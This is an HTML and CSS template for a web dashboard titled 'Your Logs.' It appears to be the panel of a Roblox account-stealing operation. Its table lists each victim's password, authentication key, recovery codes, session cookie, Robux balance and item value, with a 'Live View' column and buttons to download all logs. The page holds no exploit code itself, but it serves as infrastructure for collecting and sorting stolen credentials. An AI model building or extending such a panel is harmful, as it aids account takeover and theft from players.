<style>
  .copyable-text {
    white-space: nowrap;
    overflow-x: hidden;
    max-width: 200px;
  }
  .copyable-text::-webkit-scrollbar {
    height: 6px;
  }
  .copyable-text::-webkit-scrollbar-track {
    background: #1f2937;
  }
  .copyable-text::-webkit-scrollbar-thumb {
    background-color: #4b5563;
    border-radius: 20px;
  }

  @keyframes fadeInOut {
    0% {
      opacity: 0;
      transform: translateY(-10px);
    }
    100% {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .page-transition {
    animation: fadeInOut 0.3s ease-in-out;
  }



.discord-author {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 6px;
}

.author-avatar {
  width: 32px;
  height: 32px;
  border-radius: 50%;
}

.author-name {
  font-weight: 600;
  color: #fff;
}

.footer-icon {
  width: 16px;
  height: 16px;
  border-radius: 50%;
}
.embed-footer {
  display: flex;
  align-items: center;
  gap: 6px;
  margin-top: 8px;
  font-size: 16px;
  color: #fff;
}


    .embed-overlay {
        position: fixed;
        inset: 0;
        background: rgba(0,0,0,0.55);
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 9999;
    }

    .embed-overlay.active {
        display: flex;
    }

    .embed-popup {
        background: #2c2f33;
        border-radius: 6px;
        max-width: 560px;
        width: 100%;

        max-height: 85vh;
        overflow-y: auto;

        padding: 16px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        position: relative;
    }

    @keyframes pop {
        from { transform: scale(0.95); opacity: 0; }
        to { transform: scale(1); opacity: 1; }
    }


    .close-btn {
        position: absolute;
        top: 10px;
        right: 12px;
        background: none;
        border: none;
        color: #b9bbbe;
        font-size: 18px;
        cursor: pointer;
    }

    .close-btn:hover {
        color: white;
    }


    .embed {
        background: #2f3136;
        border-left: 4px solid #5865f2;
        padding: 16px;
        margin-top: 8px;
        border-radius: 4px;
        color: white;
    }

    .embed-title {
        font-size: 16px;
        font-weight: bold;
        margin-bottom: 8px;
    }

    .embed-description {
        margin-bottom: 10px;
        white-space: pre-line;
        color: #dcddde;
    }

    .embed-field-name {
        font-weight: 600;
    }

    .embed-field-value {
        white-space: pre-line;
        color: #dcddde;
    }

    .inline-field-row {
        display: flex;
        gap: 12px;
        margin-top: 8px;
    }

    .inline-field {
        flex: 1;
    }

    .embed-popup::-webkit-scrollbar,
    .embed-popup div::-webkit-scrollbar {
        width: 6px;
    }

    .embed-popup::-webkit-scrollbar-thumb,
    .embed-popup div::-webkit-scrollbar-thumb {
        background: #4f545c;
        border-radius: 4px;
    }




</style>
<div id="embedOverlay" class="embed-overlay" onclick="closeEmbed(event)">
    <div class="embed-popup" onclick="event.stopPropagation()">
        <div id="embedPreview"></div>
    </div>
</div>
<div class="border border-zinc-700 rounded-lg overflow-hidden">
  <div class="bg-black/30 p-6 flex justify-between items-center">
    <div>
      <h1 class="text-3xl font-bold text-white mb-2">Your Logs.</h1>
      <p class="text-zinc-400">View and Download Your Logs below.</p>
    </div>
    <div class="flex space-x-4">
      <div class="relative">
        <select
          id="sortBySelect"
          class="bg-zinc-800 hover:bg-zinc-700 text-white px-4 py-2 rounded-lg appearance-none pr-8"
        >
          <option value="">Sort by</option>
          <option value="summary">Summary</option>
          <option value="robux">Robux</option>
          <option value="rap">RAP</option>
        </select>
        <div
          class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-white"
        >
          <svg
            class="fill-current h-4 w-4"
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 20 20"
          >
            <path
              d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z"
            />
          </svg>
        </div>
      </div>
      <button
        id="downloadButton"
        class="bg-zinc-800 hover:bg-zinc-700 text-white px-4 py-2 rounded-lg"
      >
        Download Selected
      </button>
      <button
        id="downloadAllButton"
        class="bg-zinc-800 hover:bg-zinc-700 text-white px-4 py-2 rounded-lg"
      >
        Download All
      </button>
    </div>
  </div>

  <div class="overflow-x-auto">
    <table class="w-full text-sm text-left text-zinc-300">
      <thead class="text-xs uppercase bg-white/5">
        <tr>
          <th scope="col" class="px-6 py-3">
            <input
              type="checkbox"
              id="selectAll"
              class="form-checkbox h-5 w-5 text-indigo-600"
            />
          </th>
	  <th scope="col" class="px-6 py-3">Date</th>
          <th scope="col" class="px-6 py-3 w-1/3">User</th>
          <th scope="col" class="px-6 py-3">Summary</th>
          <th scope="col" class="px-6 py-3">Robux</th>
          <th scope="col" class="px-6 py-3">RAP</th>
          <th scope="col" class="px-6 py-3 w-1/3">Password</th>
          <th scope="col" class="px-6 py-3 w-1/3">AuthKey</th>
          <th scope="col" class="px-6 py-3 w-1/3">RecovCodes</th>
          <th scope="col" class="px-6 py-3 w-1/3">Cookie</th>
          <th scope="col" class="px-6 py-3 w-1/3">Download Passkey</th>
	        <th scope="col" class="px-6 py-3 w-1/3">Live View</th>
        </tr>
      </thead>
      <tbody id="userTableBody"></tbody>
    </table>
  </div>
</div>
<div class="pt-5">
  <nav aria-label="page navigation">
    <ul id="pagination" class="inline-flex -space-x-px text-sm"></ul>
  </nav>
</div>

